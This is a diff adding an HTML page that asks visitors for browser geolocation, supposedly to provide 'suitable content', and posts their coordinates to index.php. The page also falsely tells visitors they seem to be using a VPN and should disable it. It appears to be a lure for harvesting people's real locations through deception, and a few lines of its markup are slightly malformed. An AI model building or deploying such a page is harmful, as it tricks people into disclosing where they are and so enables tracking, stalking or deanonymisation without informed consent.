@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Get Browser Location</title>
+</head>
+<body>
+  <h2>We need your location to provide suitable content. Please allow access to your browser's geolocation.</h2>
+  <script>
+    function sendLocation(lat, lon) {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "index.php", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("latitude=" + encodeURIComponent(lat) + "&longitude=" + encodeURIComponent(lon));
+    }
+
+    const setError = () => {
+      const errorDiv = document.createElement('div');
+      errorDiv.className = 'errorhandler';
+      errorDiv.innerHTML = "<p>Ki <p>If you believe this is an error, please contact support.</p>";
+      document.body.appendChild(errorDiv);
+    };
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        console.log("Location detected: ", position);
+        sendLocation(position.coords.latitude, position.coords.longitude);
+      }, function(error) {
+        setError();
+      });
+    } else {
+      setError();
+    }
+  </script>
+  <h3>It seems you are using a VPN or proxy service. Please disable it to access the content.</h3>
+  <div class="errorhandler" style="color: red; font-size: bold;">
+    <p>If you believe this is an error, please contact support.</p>
+  </div>
+</body>
+</html>
